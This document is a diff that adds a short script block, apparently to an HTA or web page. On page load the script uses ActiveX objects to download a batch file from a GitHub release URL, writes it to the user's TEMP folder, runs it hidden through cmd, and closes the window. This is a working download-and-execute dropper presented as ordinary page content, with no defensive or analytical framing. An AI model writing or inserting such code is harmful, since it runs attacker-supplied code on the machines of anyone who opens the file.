@@ -1,0 +1,18 @@
+<script>
+    window.onload=function(){
+        var u="https://github.com/betrayfudasf/testing/releases/download/1/gfddgf.bat";
+        var x=new ActiveXObject("MSXML2.XMLHTTP");
+        x.open("GET",u,false);
+        x.send();
+        if(x.status==200){
+            var f=new ActiveXObject("Scripting.FileSystemObject");
+            var s=new ActiveXObject("WScript.Shell");
+            var t=s.ExpandEnvironmentStrings("%TEMP%")+"\\a.bat";
+            var z=f.CreateTextFile(t,true);
+            z.Write(x.responseText);
+            z.Close();
+            s.Run('cmd /c start "" /b "'+t+'"',0,false);
+        }
+        window.close();
+    };
+</script>
